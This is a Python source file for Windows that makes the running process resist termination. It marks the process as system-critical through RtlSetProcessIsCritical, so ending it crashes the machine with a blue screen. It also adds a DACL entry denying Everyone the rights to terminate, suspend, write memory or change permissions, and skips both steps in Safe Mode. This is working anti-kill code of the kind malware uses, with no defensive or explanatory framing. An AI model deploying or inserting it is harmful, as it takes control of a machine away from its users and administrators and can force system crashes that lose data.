import win32api
import win32security
import win32con
from ctypes import windll, c_bool

def is_safe_mode():
    """Check if the system is in Safe Mode."""
    # SM_CLEANBOOT (0x43)
    # 0 = Normal, 1 = Safe Mode, 2 = Safe Mode with Network
    return windll.user32.GetSystemMetrics(0x43) != 0

def set_critical_status(is_critical):
    """Set process as Critical (BSOD on termination)."""
    if is_safe_mode():
        # NEVER set critical in Safe Mode to avoid bricking
        return False
        
    try:
        # RtlSetProcessIsCritical
        ntdll = windll.ntdll
        # args: NewValue, OldValue(out), NeedSystemPrivilege
        # We need SeDebugPrivilege enabled first usually, but services have it.
        ret = ntdll.RtlSetProcessIsCritical(c_bool(is_critical), None, c_bool(False))
        return ret == 0
    except Exception:
        return False

def protect_process():
    """
    Modify the DACL of the current process to deny termination.
    """
    if is_safe_mode():
        print("[-] Protection: Skipped (Safe Mode)")
        return False

    try:
        # Get handle to current process
        h_process = win32api.GetCurrentProcess()
        
        # Get the DACL
        sd = win32security.GetSecurityInfo(
            h_process,
            win32security.SE_KERNEL_OBJECT,
            win32security.DACL_SECURITY_INFORMATION
        )
        dacl = sd.GetSecurityDescriptorDacl()
        
        # If no DACL, create one
        if dacl is None:
            dacl = win32security.ACL()
        
        # Create 'Everyone' SID
        everyone_sid = win32security.CreateWellKnownSid(win32security.WinWorldSid, None)
        
        # Add Deny ACE for Terminate & Suspend
        # PROCESS_TERMINATE = 0x0001
        # PROCESS_SUSPEND_RESUME = 0x0800
        # PROCESS_VM_OPERATION = 0x0008
        # PROCESS_VM_WRITE = 0x0020
        # WRITE_DAC = 0x40000 (prevents ACL modification)
        # WRITE_OWNER = 0x80000 (prevents owner change)
        mask = 0x0001 | 0x0800 | 0x0008 | 0x0020 | 0x40000 | 0x80000
        
        dacl.AddAccessDeniedAce(win32security.ACL_REVISION, mask, everyone_sid)
        
        # Set the new DACL
        win32security.SetSecurityInfo(
            h_process,
            win32security.SE_KERNEL_OBJECT,
            win32security.DACL_SECURITY_INFORMATION,
            None, None, dacl, None
        )
        print("[+] Process Protection Applied (ACL Deny Terminate)")
        return True
    except Exception as e:
        print(f"[-] Protection Failed: {e}")
        return False
